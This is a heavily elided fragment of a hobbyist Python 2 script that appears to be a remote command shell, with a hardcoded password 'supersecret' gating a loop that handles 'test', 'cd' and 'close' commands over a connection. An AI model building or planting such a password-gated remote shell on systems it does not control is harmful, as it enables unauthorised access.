...
# CURRENT PROBLEMS:
# [FIXED] + CD doesn't change the directory, which makes navigation a bitch.
...
#
# IDEAS:
# - Function that updates the script to the latest version available on github/takeoffspeed
def getip():
	...
	if password == "supersecret":
		while True:
			...
			if data.split()[0] == "test": #THIS IS A TEMPLATE; USE 'elif' IF YOU NEED MORE
				print "ITS WORKING"
			elif data.split()[0] == "cd": #THIS IS (SUPPOSED TO BE) FIXING THE CD-BUG
				filtr1=list(data) #filter out the return
				del filtr1[-1]
				print filtr1#separate them with ';'
				filtr1.append(';')
				prev.append(''.join(filtr1)) #remember the current cd commands
			elif data.split()[0] == "close": #THIS CLOSES THE CONNECTION
				conn.close()
